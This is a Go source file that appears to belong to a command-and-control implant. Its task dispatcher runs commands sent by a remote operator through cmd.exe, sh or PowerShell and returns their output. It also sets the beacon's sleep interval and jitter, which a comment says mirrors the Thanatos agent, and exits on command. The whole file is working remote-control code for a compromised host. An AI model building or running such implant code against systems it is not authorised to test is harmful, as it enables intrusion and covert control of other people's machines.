package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// dispatch runs one task and reports whether the agent must exit afterwards.
func (a *Agent) dispatch(t Task) (Response, bool) {
	resp := Response{TaskID: t.ID, Completed: true, Status: "success"}
	arg := taskArg(t.Parameters)
	switch t.Command {
	case "shell":
		out, err := runShell(arg)
		resp.UserOutput = out
		if err != nil {
			resp.Status = "error: " + err.Error()
		}
	case "powershell":
		out, err := runPowershell(arg)
		resp.UserOutput = out
		if err != nil {
			resp.Status = "error: " + err.Error()
		}
	case "sleep":
		interval, jitter, err := parseSleep(arg)
		if err != nil {
			resp.Status = "error: " + err.Error()
			resp.UserOutput = err.Error()
			return resp, false
		}
		a.interval, a.jitter = interval, jitter
		resp.UserOutput = fmt.Sprintf("sleep set to %ds jitter %d%%", interval, jitter)
	case "exit":
		resp.UserOutput = "exiting"
		return resp, true
	default:
		resp.Status = "error: unknown command " + t.Command
		resp.UserOutput = resp.Status
	}
	return resp, false
}

func runShell(arg string) (string, error) {
	name, flag := "cmd.exe", "/c"
	if runtime.GOOS != "windows" {
		name, flag = "sh", "-c"
	}
	return runCmd(name, flag, arg)
}

func runPowershell(arg string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("powershell needs Windows")
	}
	return runCmd("powershell.exe", "/c", arg)
}

func runCmd(name, flag, arg string) (string, error) {
	cmd := exec.Command(name, flag, arg)
	cmd.Env = os.Environ()
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// parseSleep reads "interval [jitter]" in seconds, e.g. "60 10".
func parseSleep(arg string) (int, int, error) {
	fields := strings.Fields(arg)
	if len(fields) == 0 || len(fields) > 2 {
		return 0, 0, fmt.Errorf("usage: sleep <interval> [jitter]")
	}
	interval, err := strconv.Atoi(fields[0])
	if err != nil || interval < 0 {
		return 0, 0, fmt.Errorf("bad interval %q", fields[0])
	}
	jitter := 0
	if len(fields) == 2 {
		jitter, err = strconv.Atoi(fields[1])
		if err != nil || jitter < 0 || jitter > 100 {
			return 0, 0, fmt.Errorf("bad jitter %q", fields[1])
		}
	}
	return interval, jitter, nil
}

// sleepTime mirrors Thanatos: interval plus/minus jitter percent.
func sleepTime(interval, jitter int) time.Duration {
	if interval <= 0 {
		return 0
	}
	if jitter <= 0 {
		return time.Duration(interval) * time.Second
	}
	delta := interval * jitter / 100
	low := interval - delta
	if low < 0 {
		low = 0
	}
	n := low
	if span := interval + delta - low; span > 0 {
		n = low + rand.Intn(span+1) //nolint:gosec // jitter needs no CSPRNG
	}
	return time.Duration(n) * time.Second
}
